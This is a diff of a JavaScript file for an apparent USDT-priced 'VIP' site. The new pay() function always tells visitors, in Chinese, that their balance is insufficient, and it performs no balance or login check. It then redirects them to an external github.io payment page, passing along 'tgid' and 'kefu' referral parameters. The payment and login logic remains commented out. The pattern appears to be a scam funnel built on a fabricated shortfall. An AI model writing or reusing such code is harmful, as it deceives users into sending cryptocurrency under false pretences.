@@ -27,10 +27,24 @@ function pricetype(t) {
 }
 
 function pay() {
-	var confirmResult = confirm('您账户余额不足，充值后使用，汇率：1USDT = 6.9元')
-				if (confirmResult) {
-					window.location.href = 'https://svip66.github.io/c/a/?vip=1'
-				}
+	var confirmResult = confirm('您账户余额不足，充值后使用')
+	if (confirmResult) {
+		function getQueryParam(name) {
+			var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)')
+			var r = window.location.search.substr(1).match(reg)
+			if (r != null) return decodeURIComponent(r[2])
+			return null
+		}
+
+		var tgid = getQueryParam('tgid')
+		var kefu = getQueryParam('kefu')
+
+		var nextUrl = 'https://usdt8.github.io/d/1.html?vip=1'
+		if (tgid) nextUrl += '&tgid=' + tgid
+		if (kefu) nextUrl += '&kefu=' + kefu
+
+		window.location.href = nextUrl
+	}
 }
 
 function getcountry() {
@@ -72,38 +86,33 @@ function getCurrentDateTime() {
 }
 
 function paylsturl() {
-// 	if (islogin()) {
-// 		$('#login_tip').hide()
-
-// 		$('#trc_paylist_url').click(function () {
-// 			var amount = $('.tdactive').attr('value') || $('.tdactive input').val()
-// 			window.location.href = $('#data_url').val() + 'index/pay/wallet?paytype=trc&amount=' + amount
-// 		})
-
-// 		$('#erc_paylist_url').click(function () {
-// 			var amount = $('.tdactive').attr('value') || $('.tdactive input').val()
-// 			window.location.href = $('#data_url').val() + 'index/pay/wallet?paytype=erc&amount=' + amount
-// 		})
-
-// 		$('#bsc_paylist_url').click(function () {
-// 			var amount = $('.tdactive').attr('value') || $('.tdactive input').val()
-// 			window.location.href = $('#data_url').val() + 'index/pay/wallet?paytype=bsc&amount=' + amount
-// 		})
-
-// 		$('#okc_paylist_url').click(function () {
-// 			var amount = $('.tdactive').attr('value') || $('.tdactive input').val()
-// 			window.location.href = $('#data_url').val() + 'index/pay/wallet?paytype=okc&amount=' + amount
-// 		})
-// 	} else {
-// 		$('#trc_paylist_url').attr('href', 'javascript:void(0)')
-// 		$('#erc_paylist_url').attr('href', 'javascript:void(0)')
-
-// 		$('#trc_paylist_url,#erc_paylist_url').click(function () {
-// 			layer.msg('请先登录', function () {
-// 				window.location.href = 'account.html'
-// 			})
-// 		})
-// 	}
+	// 	if (islogin()) {
+	// 		$('#login_tip').hide()
+	// 		$('#trc_paylist_url').click(function () {
+	// 			var amount = $('.tdactive').attr('value') || $('.tdactive input').val()
+	// 			window.location.href = $('#data_url').val() + 'index/pay/wallet?paytype=trc&amount=' + amount
+	// 		})
+	// 		$('#erc_paylist_url').click(function () {
+	// 			var amount = $('.tdactive').attr('value') || $('.tdactive input').val()
+	// 			window.location.href = $('#data_url').val() + 'index/pay/wallet?paytype=erc&amount=' + amount
+	// 		})
+	// 		$('#bsc_paylist_url').click(function () {
+	// 			var amount = $('.tdactive').attr('value') || $('.tdactive input').val()
+	// 			window.location.href = $('#data_url').val() + 'index/pay/wallet?paytype=bsc&amount=' + amount
+	// 		})
+	// 		$('#okc_paylist_url').click(function () {
+	// 			var amount = $('.tdactive').attr('value') || $('.tdactive input').val()
+	// 			window.location.href = $('#data_url').val() + 'index/pay/wallet?paytype=okc&amount=' + amount
+	// 		})
+	// 	} else {
+	// 		$('#trc_paylist_url').attr('href', 'javascript:void(0)')
+	// 		$('#erc_paylist_url').attr('href', 'javascript:void(0)')
+	// 		$('#trc_paylist_url,#erc_paylist_url').click(function () {
+	// 			layer.msg('请先登录', function () {
+	// 				window.location.href = 'account.html'
+	// 			})
+	// 		})
+	// 	}
 }
 
 //是否包含字符
@@ -120,19 +129,19 @@ function contain_str(str1, str2) {
 
 //是否登录
 function islogin() {
-// 	let flag = false
-// 	$.ajax({
-// 		url: $('#data_url').val() + 'api/user/index',
-// 		type: 'post',
-// 		async: false,
-// 		beforeSend: function (request) {
-// 			request.setRequestHeader('token', $.cookie('token'))
-// 		},
-// 		success: function (result) {
-// 			flag = result.code == 1 ? true : false
-// 		},
-// 	})
-	return 
+	// 	let flag = false
+	// 	$.ajax({
+	// 		url: $('#data_url').val() + 'api/user/index',
+	// 		type: 'post',
+	// 		async: false,
+	// 		beforeSend: function (request) {
+	// 			request.setRequestHeader('token', $.cookie('token'))
+	// 		},
+	// 		success: function (result) {
+	// 			flag = result.code == 1 ? true : false
+	// 		},
+	// 	})
+	return
 }
 
 //时间戳转时间格式
